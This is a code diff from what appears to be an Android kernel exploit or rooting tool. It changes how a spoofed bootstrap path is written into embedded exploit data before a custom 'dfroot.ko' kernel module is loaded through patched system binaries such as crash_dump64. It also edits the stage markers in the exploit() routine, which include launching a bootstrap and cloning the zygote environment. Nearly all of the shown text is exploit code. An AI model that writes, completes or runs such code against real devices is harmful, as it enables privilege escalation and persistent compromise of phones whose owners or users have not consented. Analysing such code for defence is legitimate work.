@@ -19,6 +19,7 @@
 
 static const char kCrashDump[] = "/apex/com.android.runtime/bin/crash_dump64";
 static char    *libcxx_ko_target;
+static char    *libcxx_bootstrap;
 
 /* Runtime bootstrap path, supplied via --bootstrap-path for spoofed/renamed
  * builds. When empty, the ko's compiled-in default path is used unchanged. */
@@ -244,6 +245,7 @@ extern char libcxx_data[];
 extern uint32_t libcxx_len;
 extern char libcxx_first_inst_copy[];
 extern uint32_t libcxx_ko_target_off;
+extern uint32_t libcxx_bootstrap_off;
 
 asm(
     ".section .rodata\n"
@@ -348,38 +350,6 @@ static int patch_helper(void) {
     return 0;
 }
 
-/* Rewrite the ko's hardcoded bootstrap path (the static char bootstrap[256]
- * slot in dfroot.c) with the runtime path for spoofed/renamed builds. Returns
- * 0 on success (or when there is nothing to patch), -1 if the slot is missing
- * or the runtime path doesn't fit — patch_ko() aborts on -1 so a stale ko blob
- * fails loudly instead of silently execing the default package and timing out. */
-static int patch_ko_bootstrap(char *buf, size_t len) {
-    if (!g_bootstrap_path[0]) return 0;
-    if (!strcmp(g_bootstrap_path, kDefaultBootstrap)) return 0;
-
-    size_t need = strlen(kDefaultBootstrap);
-    char *slot = NULL;
-    for (size_t i = 0; i + need <= len; i++) {
-        if (memcmp(buf + i, kDefaultBootstrap, need) == 0) {
-            slot = buf + i;
-            break;
-        }
-    }
-    if (!slot || slot + 256 > buf + len) {
-        printf("patch: ERROR - bootstrap slot not found in ko (len=%zu); stale ko blob?\n", len);
-        return -1;
-    }
-    size_t plen = strlen(g_bootstrap_path);
-    if (plen >= 256) {
-        printf("patch: ERROR - bootstrap path too long (%zu)\n", plen);
-        return -1;
-    }
-    memset(slot, 0, 256);
-    memcpy(slot, g_bootstrap_path, plen);
-    printf("patch: bootstrap path -> %s\n", g_bootstrap_path);
-    return 0;
-}
-
 static int patch_ko(void) {
     int andr = 0, major = 0, minor = 0;
     if (read_device_versions(&andr, &major, &minor) != 0) {
@@ -395,10 +365,6 @@ static int patch_ko(void) {
     size_t len;
     char *buf = pad16(ko->start, (size_t)(ko->end - ko->start), &len);
     if (!buf) { printf("patch: %s - pad16 alloc failed\n", libcxx_ko_target); return -1; }
-    if (patch_ko_bootstrap(buf, len) != 0) {
-        free(buf);
-        return -1;
-    }
     printf("patch: %s <- dfroot.ko (%zu bytes)\n", libcxx_ko_target, len);
     int ret = patch_file_cbc(libcxx_ko_target, buf, len, 0, 1);
     free(buf);
@@ -560,6 +526,13 @@ static int setup(int argc, char **argv) {
     strncpy(libcxx_ko_target, ko_target, 63);
     libcxx_ko_target[63] = '\0';
 
+    libcxx_bootstrap = libcxx_data + libcxx_bootstrap_off;
+    if (g_bootstrap_path[0] && strcmp(g_bootstrap_path, kDefaultBootstrap) != 0) {
+        memset(libcxx_bootstrap, 0, 256);
+        strncpy(libcxx_bootstrap, g_bootstrap_path, 255);
+        printf("patch: bootstrap path -> %s\n", g_bootstrap_path);
+    }
+
     printf("=== setup ===\n");
     printf("found ko_target: %s\n", ko_target);
     printf("encap port: %d\n", encap_port);
@@ -591,7 +564,6 @@ static int exploit(void) {
     } markers[] = {
         { "/dev/df",    "libc++: loading custom module",                    -1 },
         { "/dev/dfm0",  "kernel module: launching bootstrap",               -1 },
-        { "/dev/dfm0e", "bootstrap: ERROR - exec bootstrap failed",          1 },
         { "/dev/dfm1",  "bootstrap: loading app preferences file",          -1 },
         { "/dev/dfme0", "bootstrap: ERROR - reading prefs failed",           1 },
         { "/dev/dfm2",  "bootstrap: cloning zygote env",                    -1 },
